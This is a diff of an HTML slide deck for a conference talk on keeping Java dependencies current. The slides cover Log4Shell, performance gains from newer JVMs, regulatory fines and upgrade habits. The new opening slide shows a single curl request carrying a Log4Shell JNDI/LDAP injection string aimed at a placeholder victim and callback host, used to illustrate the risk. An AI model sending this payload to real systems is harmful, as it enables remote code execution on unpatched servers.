@@ -4,96 +4,16 @@
         <span class="chapter-kicker">Chapter 01</span>
         <h1>The Problem</h1>
         <div class="chapter-rule"></div>
-        <h2>Managing Your Software Dependencies</h2>
+        <h2>Old Software Is Never Free</h2>
     </section>
 
     <section>
-        <img src="pictures/Sculpture.jpg" class="r-stretch">
-    </section>
-
-    <section>
-        <h2>Dependencies Example</h2>
-        <div class="box box-blue medium" style="margin-top:0.8em;">
-            <span class="java-pill">☕ Java example</span>
-            <div class="puml-wrap">
-                <img data-puml-src="architecture-example.puml" alt="Same nested layers, each annotated with a concrete example: the Docker image tag, the OS distribution, the JVM runtime, the compiled jar, and its bundled dependencies.">
-            </div>
+        <h2>One Request</h2>
+        <div class="box box-red medium" style="margin-top:1.2em;">
+            <pre style="font-size:1.15em;"><code class="language-bash">curl "http://victim:8080/api/products/search\
+?q=\${jndi:ldap://callback:1389/pwnkit}"</code></pre>
         </div>
-    </section>
-
-
-    <section>
-        <h2>🚨 Many Dependencies</h2>
-        <div class="medium">
-            <ul class="icon-list" style="margin-top:0.8em;">
-                <li><span class="ic">🧩</span><span>Every application has <strong>direct</strong> and <strong>transitive</strong> dependencies, often hundreds</span></li>
-                <li><span class="ic">🎲</span><span>Potential Common Vulnerabilities and Exposures (CVEs)</span></li>
-            </ul>
-        </div>
-    </section>
-
-    <section>
-        <h2>The Compounding Cost of Delay</h2>
-        <div class="medium">
-            <ul class="icon-list">
-                <li><span class="ic">🔐</span><span><strong>Security:</strong> more versions to jump over when a CVE forces your hand</span></li>
-                <li><span class="ic">⚡</span><span><strong>Performance:</strong> you leave free speed on the table</span></li>
-                <li><span class="ic">🧗</span><span><strong>Migration effort:</strong> small incremental hops are easy</span></li>
-            </ul>
-        </div>
-    </section>
-
-    <section>
-        <h2>⚖️ It's Not Just Best Practice Anymore</h2>
-        <img src="pictures/Law.jpg" class="r-stretch">
-    </section>
-
-    <section>
-        <h2>⚖️ Australia: What Actually Got Fined</h2>
-        <div class="box box-red medium" style="margin-top:0.6em;">
-            <table style="margin-top:0.4em;">
-                <thead><tr><th>Case</th><th>What happened</th></tr></thead>
-                <tbody>
-                    <tr><td>Australian Clinical Labs, 2025</td><td>First-ever penalty under the Act: <strong>$5.8M</strong>. The 2022 breach itself (223,000 people) wasn't the trigger; a ~3-week delay notifying the regulator was, despite knowing it could have notified within 2–3 days.</td></tr>
-                    <tr><td>Medibank, ongoing</td><td>9.7M people's health data exposed (2022). OAIC is suing for up to <strong>$2.22M per contravention</strong>; press has floated exposure running to trillions if that's read per affected person. Still before the Federal Court.</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </section>
-
-    <section>
-        <img src="pictures/Talk_to_the_hand.jpg" class="r-stretch">
-    </section>
-
-    <section>
-        <h2>Concrete Examples</h2>
-        <ul class="icon-list medium" style="max-width:480px;margin:0.8em auto 0;">
-            <li><span class="ic">🚀</span><span>Performance benefit</span></li>
-            <li><span class="ic">🦠</span><span>Vulnerable application</span></li>
-            <li><span class="ic">🔎</span><span>Known vulnerabilities</span></li>
-        </ul>
-    </section>
-
-    <section class="example-slide">
-        <span class="example-kicker">Example 1 of 3</span>
-        <h1>🚀 Performance Benefit</h1>
-        <div class="example-rule"></div>
-    </section>
-
-    <section>
-        <h2>🔍 Performance Benchmarks: Full Report</h2>
-        <div class="iframe-wrap">
-            <iframe src="https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/" loading="lazy" title="Java performance benchmark report"></iframe>
-        </div>
-        <p class="small" style="margin-top:0.4em;">
-            <a class="go-btn" href="https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/" target="_blank">↗ Open in new tab</a>
-        </p>
-    </section>
-
-    <section class="example-slide">
-        <span class="example-kicker">Example 2 of 3</span>
-        <h1>🦠 Vulnerable Application</h1>
-        <div class="example-rule"></div>
+        <p class="medium" style="margin-top:1em;">That is the whole attack. No credentials, no user interaction.</p>
     </section>
 
     <section>
@@ -166,22 +86,20 @@
     </section>
 
     <section>
-        <h2>🔥 Log4Shell</h2>
+        <h2>🔥 Log4Shell: The Fix Was Never the Problem</h2>
         <div class="stat-row medium">
             <div class="stat-tile"><span class="num">10.0</span><span class="lbl">CVSS score: the maximum possible</span></div>
             <div class="stat-tile"><span class="num">93%</span><span class="lbl">of cloud environments exposed</span></div>
-            <div class="stat-tile"><span class="num">2 hrs</span><span class="lbl">for the vendor to ship a patch</span></div>
-            <div class="stat-tile"><span class="num">Weeks</span><span class="lbl">for most teams to actually deploy it</span></div>
+            <div class="stat-tile"><span class="num">1 day</span><span class="lbl">from public disclosure to a released fix</span></div>
+            <div class="stat-tile"><span class="num">40M</span><span class="lbl">vulnerable Log4j downloads in 2025, four years later</span></div>
         </div>
         <div class="box box-red medium" style="margin-top:0.5em;">
-            <ul class="icon-list" style="margin-top:0.8em;">
-                <li>Billions of dollars in remediation</li>
-            </ul>
+            <p style="margin:0.2em 0;">95% of vulnerable downloads already had a fixed version available. The fix existed; teams just didn't move.</p>
         </div>
     </section>
 
     <section>
-        <h2>Defense in Depth</h2>
+        <h2>What Would Have Limited the Damage?</h2>
         <ul class="icon-list">
             <li><span class="ic">🔒</span><span>No root access</span></li>
             <li><span class="ic">🐳</span><span>No (old) Docker image</span></li>
@@ -190,9 +108,75 @@
         </ul>
     </section>
 
+    <section>
+        <img src="pictures/Sculpture.jpg" class="r-stretch">
+    </section>
+
+    <section>
+        <h2>Dependencies Example</h2>
+        <div class="box box-blue medium" style="margin-top:0.8em;">
+            <span class="java-pill">☕ Java example</span>
+            <div class="puml-wrap">
+                <img data-puml-src="architecture-example.puml" alt="Same nested layers, each annotated with a concrete example: the Docker image tag, the OS distribution, the JVM runtime, the compiled jar, and its bundled dependencies.">
+            </div>
+        </div>
+    </section>
+
+    <section>
+        <h2>🚨 Most of Your Application Isn't Your Code</h2>
+        <div class="medium">
+            <ul class="icon-list" style="margin-top:0.8em;">
+                <li><span class="ic">🧩</span><span>Hundreds of <strong>direct</strong> and <strong>transitive</strong> dependencies, plus the OS, runtime and base image</span></li>
+                <li><span class="ic">🎲</span><span>Every one of them can ship the next CVE</span></li>
+                <li><span class="ic">⏳</span><span>Code you didn't write still ages, even when you don't touch it</span></li>
+            </ul>
+        </div>
+    </section>
+
+    <section>
+        <h2>The Compounding Cost of Delay</h2>
+        <div class="medium">
+            <ul class="icon-list">
+                <li><span class="ic">🔐</span><span><strong>Security:</strong> when a CVE forces your hand, you jump five versions under pressure instead of one</span></li>
+                <li><span class="ic">⚡</span><span><strong>Performance:</strong> every release you skip is free speed you don't get</span></li>
+                <li><span class="ic">🧗</span><span><strong>Migration effort:</strong> ten small hops are cheaper than one big leap</span></li>
+            </ul>
+        </div>
+    </section>
+
+    <section>
+        <img src="pictures/Talk_to_the_hand.jpg" class="r-stretch">
+    </section>
+
     <section class="example-slide">
-        <span class="example-kicker">Example 3 of 3</span>
-        <h1>🔎 Known Vulnerabilities</h1>
+        <span class="example-kicker">Example</span>
+        <h1>🚀 Free Performance</h1>
+        <div class="example-rule"></div>
+    </section>
+
+    <section>
+        <h2>Same Code, Newer JVM</h2>
+        <div class="stat-row good medium">
+            <div class="stat-tile"><span class="num">48%</span><span class="lbl">faster summing a primitive array</span></div>
+            <div class="stat-tile"><span class="num">27%</span><span class="lbl">faster allocating and processing strings</span></div>
+            <div class="stat-tile"><span class="num">17%</span><span class="lbl">less memory allocated by a stream pipeline</span></div>
+        </div>
+        <p class="medium" style="margin-top:0.8em;">Java 17 &rarr; 25, JMH, zero code changes.</p>
+    </section>
+
+    <section>
+        <h2>🔍 Performance Benchmarks: Full Report</h2>
+        <div class="iframe-wrap">
+            <iframe src="https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/" loading="lazy" title="Java performance benchmark report"></iframe>
+        </div>
+        <p class="small" style="margin-top:0.4em;">
+            <a class="go-btn" href="https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/" target="_blank">↗ Open in new tab</a>
+        </p>
+    </section>
+
+    <section class="example-slide">
+        <span class="example-kicker">Example</span>
+        <h1>🔎 How Exposed Are You?</h1>
         <div class="example-rule"></div>
     </section>
 
@@ -218,56 +202,6 @@
     </section>
 
     <section>
-        <h2>Layer 1: Source-Level Scanning</h2>
-        <div class="box box-blue medium" style="margin-top:0.5em;">
-            <span class="java-pill">☕ OWASP Dependency Check (Java)</span>
-            <p class="small" style="margin:0.2em 0 0;">Analyzers for Java (Maven/Gradle), .NET, Node.js, Python and others; this demo uses the Maven plugin.</p>
-            <pre><code class="language-xml">&lt;plugin&gt;
-    &lt;groupId&gt;org.owasp&lt;/groupId&gt;
-    &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;
-    &lt;configuration&gt;
-        &lt;failBuildOnCVSS&gt;7&lt;/failBuildOnCVSS&gt;  &lt;!-- fail on HIGH+ --&gt;
-    &lt;/configuration&gt;
-&lt;/plugin&gt;</code></pre>
-            <pre><code class="language-bash">./mvnw dependency-check:check
-# log4j-core-2.0.jar      → CVE-2021-44228 CRITICAL 10.0 🔴
-# jackson-databind-2.9.10 → CVE-2019-14379 CRITICAL  9.8 🔴</code></pre>
-        </div>
-        <p class="small">
-            <a class="go-btn" href="https://johanjanssen.github.io/Keep-Up-To-Date/OWASP" target="_blank">▶ View OWASP Dependency Check Report</a>
-        </p>
-    </section>
-
-    <section>
-        <h2>Layer 2: Image / Artifact Scanning</h2>
-        <div class="box box-blue medium" style="margin-top:0.5em;">
-            <span class="java-pill">🌐 Trivy (Aqua)</span>
-            <pre><code class="language-bash">trivy image eclipse-temurin:25-jre
-trivy image --format sarif --output trivy-results.sarif eclipse-temurin:25-jre
-trivy image --severity HIGH,CRITICAL --exit-code 1 eclipse-temurin:25-jre</code></pre>
-        </div>
-        <div class="box box-blue medium" style="margin-top:0.5em;">
-            <span class="java-pill">🌐 Grype (Anchore)</span>
-            <pre><code class="language-bash">grype eclipse-temurin:25-jre
-grype eclipse-temurin:25-jre -o sarif > grype-results.sarif
-grype eclipse-temurin:25-jre --fail-on high</code></pre>
-        </div>
-    </section>
-
-    <section>
-        <h2>OSV-Scanner Operates on Both Layers</h2>
-        <div class="medium">
-            <p>One CLI that reads lockfiles, SBOMs <em>and</em> images across 20+ ecosystems, all against the same open OSV database.</p>
-        </div>
-        <div class="box box-blue medium" style="margin-top:0.6em;">
-            <span class="java-pill">🌐 osv-scanner</span>
-            <pre><code class="language-bash">osv-scanner scan source --lockfile=pom.xml .
-osv-scanner scan image eclipse-temurin:25-jre
-osv-scanner scan --sbom=target/bom.json .</code></pre>
-        </div>
-    </section>
-
-    <section>
         <img src="pictures/Search.jpg" class="r-stretch">
     </section>
 
@@ -282,17 +216,40 @@ osv-scanner scan --sbom=target/bom.json .</code></pre>
     </section>
 
     <section>
+        <h2>⚖️ It's Not Just Best Practice Anymore</h2>
+        <img src="pictures/Law.jpg" class="r-stretch">
+    </section>
+
+    <section>
+        <h2>⚖️ EU Cyber Resilience Act</h2>
+        <div class="stat-row medium">
+            <div class="stat-tile"><span class="num">24 hrs</span><span class="lbl">to report an actively exploited vulnerability, since 11 Sep 2026</span></div>
+            <div class="stat-tile"><span class="num">Dec 2027</span><span class="lbl">no known exploitable vulnerabilities allowed when you ship</span></div>
+            <div class="stat-tile"><span class="num">&euro;15M</span><span class="lbl">or 2.5% of global turnover, whichever is higher</span></div>
+        </div>
+        <div class="box box-red medium" style="margin-top:0.5em;">
+            <p style="margin:0.2em 0;">Other places are moving the same way: Australia has already handed out its first multimillion-dollar fine.</p>
+        </div>
+        <aside class="notes">
+            Australia: Australian Clinical Labs, 2025, first-ever penalty under the Privacy Act: $5.8M.
+            The 2022 breach itself (223,000 people) wasn't the trigger; a ~3-week delay notifying the regulator was.
+            Medibank, ongoing: 9.7M people's health data exposed (2022). OAIC is suing for up to $2.22M per contravention; still before the Federal Court.
+        </aside>
+    </section>
+
+    <section>
         <img src="pictures/Mirror.jpg" class="r-stretch">
     </section>
 
     <section>
         <h2>How's Your Situation?</h2>
+        <p class="medium">Hands up if you know, without looking it up:</p>
         <div class="medium">
-            <ul class="icon-list" style="margin-top:0.8em;">
-                <li><span class="ic">❓</span><span>What software (versions) are you using?</span></li>
-                <li><span class="ic">❓</span><span>How many known security vulnerabilities has your application?</span></li>
-                <li><span class="ic">❓</span><span>Do you remove dead code and unused operating system packages and libraries?</span></li>
-                <li><span class="ic">❓</span><span>How often do you upgrade your software?</span></li>
+            <ul class="icon-list" style="margin-top:0.6em;">
+                <li><span class="ic">❓</span><span>Which Java, framework and base image version runs in production</span></li>
+                <li><span class="ic">❓</span><span>How many known vulnerabilities your application has right now</span></li>
+                <li><span class="ic">❓</span><span>When you last removed an unused library or OS package</span></li>
+                <li><span class="ic">❓</span><span>When you last upgraded</span></li>
             </ul>
         </div>
     </section>
@@ -301,12 +258,10 @@ osv-scanner scan --sbom=target/bom.json .</code></pre>
         <h2>It's Easy to Blame Management</h2>
         <div class="medium">
             <ul class="icon-list" style="margin-top:0.8em;">
-                <li><span class="ic">🤔</span><span>Who benefits most from new software?</span></li>
-                <li><span class="ic">📉</span><span>Overestimating an upgrade results in delays or cancellations</span></li>
+                <li><span class="ic">🤔</span><span>Who benefits most from new software? Often us, the developers</span></li>
+                <li><span class="ic">📉</span><span>Overestimating an upgrade leads to delays or cancellations</span></li>
                 <li><span class="ic">⏱️</span><span>Spend one spare hour investigating; the upgrade is usually smaller than feared</span></li>
-                <li><span class="ic">🛠️</span><span>Modern tooling makes upgrades far easier</span></li>
-                <li><span class="ic">🗣️</span><span>It's not easy to convince management to spend time on it</span></li>
-                <li><span class="ic">😒</span><span>Even developers complain about automated upgrades</span></li>
+                <li><span class="ic">😒</span><span>Even developers complain about automated upgrade PRs</span></li>
             </ul>
         </div>
     </section>
